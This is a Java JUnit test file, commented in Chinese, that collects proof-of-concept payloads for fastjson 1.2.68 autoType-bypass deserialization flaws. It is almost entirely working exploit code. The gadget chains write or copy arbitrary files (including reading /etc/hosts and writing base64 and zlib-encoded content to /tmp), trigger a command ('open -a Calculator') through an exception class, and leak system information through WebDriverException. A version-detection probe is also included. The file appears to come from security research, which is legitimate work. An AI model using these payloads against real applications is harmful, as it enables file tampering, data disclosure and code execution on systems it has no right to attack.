package me.mole;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import me.mole.pojo.Student;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.WebDriverException;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.zip.Inflater;
import java.util.zip.InflaterOutputStream;

public class Fastjson1268ApplicationTest {
    /**
     *  fastjson <= 1.2.68
     *    测试
     *    {
     *      "@type": "java.lang.AutoCloseable",
     *      "@type": "java.io.FileOutputStream"
     *    }
     */

    @Test
    public void test_1268_1() {
        /**
         * 经源码调试可知:
         *    (1) 在JavaBeanInfo#build()函数中，会检查是否存在调试信息(需要构造函数的参数名)，
         *         如果不存在调试信息，会抛出找不到默认构造函数的异常(JSONException: default constructor not found)
         *    (2) 如果没有默认无参构造函数，则会选择参数最多的且排在最前面的构造函数
         */

        String testStr = "{\n" +
                "\"@type\": \"java.lang.AutoCloseable\"," +
                "\"@type\": \"java.io.FileOutputStream\"," +
                "\"file\": \"/Users/fa1c0n/tmp/test2.txt\"," +
                "\"append\": \"false\"" +
                "}";

        System.out.println(testStr);
        JSON.parse(testStr);
    }

    @Test
    public void test_1268_2() {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String testStr = "{\"@type\":\"me.mole.pojo.Student\",\"age\":6,\"name\":\"lAdyb1rd\",\"_properties\":{\"k1\":\"val1\"}}";
        testStr = "{\"@type\": \"java.lang.AutoCloseable\", \"@type\":\"me.mole.pojo.Student\",\"age\":6,\"name\":\"lAdyb1rd\",\"_properties\":{\"k1\":\"val1\"}}";
//        testStr = "{\"age\":6,\"name\":\"lAdyb1rd\",\"_properties\":{\"k1\":\"val1\"}}";
        System.out.println(testStr);
        System.out.println("----------反序列化: JSON.parse------------");
        Object stu1 = JSON.parse(testStr);
        System.out.println(stu1);
//        System.out.println("----------反序列化: JSON.parseObject------------");
//        Student stu2 = JSON.parseObject(testStr, Student.class);//第二个参数就是expectClass(期望要反序列化成的类)
//        System.out.println(stu2);
    }

    @Test
    public void test_1268_3() {
        try {
            FileOutputStream fos = new FileOutputStream("/tmp/fj_hack_jdk11");
            Inflater inflater = new Inflater();
            int bufLen = 1048576;
            InflaterOutputStream inflaterOutputStream = new InflaterOutputStream(fos, inflater, bufLen);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * 用来精确检测版本：
     */
    @Test
    public void test_detectVersion() {
        //精确检测版本
        String version_poc_1 = "{\"@type\":\"java.lang.AutoCloseable\"}";
        System.out.println(version_poc_1);
        JSON.parse(version_poc_1);
    }

    /**
     * fastjson <= 1.2.68  (Throwable)
     *   {"x":
     *      {"@type":"java.lang.Exception",
     *      "@type":"me.mole.exception.CalcException", "command":"open -a Calculator"},
     *    "y":{"$ref":"$x.message"}
     *   }
     */
    @Test
    public void test_1268_poc_1() {
        String fj_poc = "{\"x\":{\"@type\":\"java.lang.Exception\", " +
                "\"@type\":\"me.mole.exception.CalcException\", \"command\":\"open -a Calculator\"}, " +
                "\"y\":{\"$ref\":\"$x.message\"}}";

        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    /**
     * fastjson <= 1.2.68  (Throwable)
     *  依赖selenium
     *  <dependency>
     *    <groupId>org.seleniumhq.selenium</groupId>
     *    <artifactId>selenium-api</artifactId>
     *    <version>4.1.1</version>
     *  </dependency>
     *
     *   {"x":
     *     {"@type":"java.lang.Exception",
     *     "@type":"org.openqa.selenium.WebDriverException"},
     *    "y":{"$ref":"$x.message"}
     *   }
     *
     *   PoC只是示例，能否回显得看目标程序的实现，且PoC需要根据目标程序的实现作出相应修改。
     *
     */
    @Test
    public void test_1268_poc_2() {
//        WebDriverException we = new WebDriverException();
//        System.out.println(we.getMessage());
//        System.out.println(we.getSystemInformation());
//        for (StackTraceElement ste : we.getStackTrace()) {
//            System.out.println(ste);
//        }

        String fj_poc = "{\"x\":\n" +
                "  {\"@type\":\"java.lang.Exception\",\n" +
                "  \"@type\":\"org.openqa.selenium.WebDriverException\"},\n" +
                " \"y\":{\"$ref\":\"$x.systemInformation\"}\n" +
                "}";

        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    /**
     * fastjson <= 1.2.68  (AutoCloseable)
     * 依赖：
     *   <dependency>
     *      <groupId>org.aspectj</groupId>
     *      <artifactId>aspectjtools</artifactId>
     *      <version>1.9.5</version>
     *   </dependency>
     *
     *  复制文件
     *
     *  {
     *   '@type':"java.lang.AutoCloseable",
     *   '@type':'org.eclipse.core.internal.localstore.SafeFileOutputStream',
     *   'targetPath':'/Users/fa1c0n/tmp/hosts.txt',
     *   'tempPath':'/etc/hosts'
     *  }
     */
    @Test
    public void test_1268_poc_3() {
        String fj_poc = "{\n" +
                "  '@type':\"java.lang.AutoCloseable\",\n" +
                "  '@type':'org.eclipse.core.internal.localstore.SafeFileOutputStream',\n" +
                "  'targetPath':'/Users/fa1c0n/tmp/hosts.txt',\n" +
                "  'tempPath':'/etc/hosts'\n" +
                "}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    /**
     * fastjson <= 1.2.68  (AutoCloseable)
     * 依赖:
     *   <dependency>
     *      <groupId>org.aspectj</groupId>
     *      <artifactId>aspectjtools</artifactId>
     *      <version>1.9.5</version>
     *   </dependency>
     *   <dependency>
     *      <groupId>com.esotericsoftware</groupId>
     *      <artifactId>kryo</artifactId>
     *      <version>4.0.0</version>
     *   </dependency>
     *   <dependency>
     *      <groupId>com.sleepycat</groupId>
     *      <artifactId>je</artifactId>
     *      <version>18.3.12</version>
     *   </dependency>
     *
     * 写文件
     * {
     *     'stream':
     *     {
     *         '@type':"java.lang.AutoCloseable",
     *         '@type':'org.eclipse.core.internal.localstore.SafeFileOutputStream',
     *         'targetPath':'/tmp/dst',
     *         'tempPath':'/tmp/src'
     *     },
     *     'writer':
     *     {
     *         '@type':"java.lang.AutoCloseable",
     *         '@type':'com.esotericsoftware.kryo.io.Output',
     *         'buffer':'YjF1M3I=',
     *         'outputStream':
     *         {
     *             '$ref':'$.stream'
     *         },
     *         'position':5
     *     },
     *     'close':
     *     {
     *         '@type':"java.lang.AutoCloseable",
     *         '@type':'com.sleepycat.bind.serial.SerialOutput',
     *         'out':
     *         {
     *             '$ref':'$.writer'
     *         }
     *     }
     * }
     */
    @Test
    public void test_1268_poc_4() {
        String fj_poc = "{\n" +
                "    'stream':\n" +
                "    {\n" +
                "        '@type':\"java.lang.AutoCloseable\",\n" +
                "        '@type':'org.eclipse.core.internal.localstore.SafeFileOutputStream',\n" +
                "        'targetPath':'/tmp/dst',\n" +
                "        'tempPath':'/tmp/src'\n" +
                "    },\n" +
                "    'writer':\n" +
                "    {\n" +
                "        '@type':\"java.lang.AutoCloseable\",\n" +
                "        '@type':'com.esotericsoftware.kryo.io.Output',\n" +
                "        'buffer':'aGFja2VkIGJ5IG0wMWUu',\n" +
                "        'outputStream':\n" +
                "        {\n" +
                "            '$ref':'$.stream'\n" +
                "        },\n" +
                "        'position':15\n" +
                "    },\n" +
                "    'close':\n" +
                "    {\n" +
                "        '@type':\"java.lang.AutoCloseable\",\n" +
                "        '@type':'com.sleepycat.bind.serial.SerialOutput',\n" +
                "        'out':\n" +
                "        {\n" +
                "            '$ref':'$.writer'\n" +
                "        }\n" +
                "    }\n" +
                "}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }


    /**
     *  fastjson <= 1.2.68 (AutoCloseable)
     * <p>
     *   取决于JDK是否保留了包含LocalVariableTable部分的调试信息
     *    这里使用OpenJDK 11进行复现, 因为OpenJDK 11有调试信息.
     * </p>
     */
    @Test
    public void test_1268_poc_5() {
        String fj_poc = "{\n" +
                "    '@type':\"java.lang.AutoCloseable\",\n" +
                "    '@type':'sun.rmi.server.MarshalOutputStream',\n" +
                "    'out':\n" +
                "    {\n" +
                "        '@type':'java.util.zip.InflaterOutputStream',\n" +
                "        'out':\n" +
                "        {\n" +
                "           '@type':'java.io.FileOutputStream',\n" +
                "           'file':'/tmp/fj_hack_jdk11',\n" +
                "           'append':false\n" +
                "        },\n" +
                "        'infl':\n" +
                "        {\n" +
                "            'input':\n" +
                "            {\n" +
                "                'array':'eNoLz0gsKS4uLVBIL60s1lEoycgsVgCiXAPDVD0FT/VchYzUolSFknyF8sSSzLx0hbT8IoVQhbz8cj0uAGcUE78=',\n" +
                "                'limit':65\n" +
                "            }\n" +
                "        },\n" +
                "        'bufLen':1048576\n" +
                "    },\n" +
                "    'protocolVersion':1\n" +
                "}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }


    /**
     * fastjson <= 1.2.68 (AutoCloseable)
     * 依赖commons-io
     *
     * 写文件
     */
    @Test
    public void test_1268_poc_6() {

    }
}
